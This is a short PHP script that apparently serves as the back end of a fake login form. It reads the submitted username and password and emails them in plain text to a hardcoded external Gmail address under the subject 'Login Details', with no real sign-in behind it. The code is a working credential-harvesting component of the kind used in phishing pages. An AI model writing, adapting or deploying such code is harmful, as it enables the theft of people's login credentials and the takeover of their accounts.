<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];

  // Set up the email parameters
  $to = "ivanzheng4826@gmail.com"; // Replace with your email address
  $subject = "Login Details";
  $message = "Username: " . $username . "\nPassword: " . $password;
  $headers = "From: sender-email@example.com"; // Replace with the sender's email address

  // Send the email
  $success = mail($to, $subject, $message, $headers);

  if ($success) {
    echo "Success!";
  } else {
    echo "Failed.";
  }
}
?>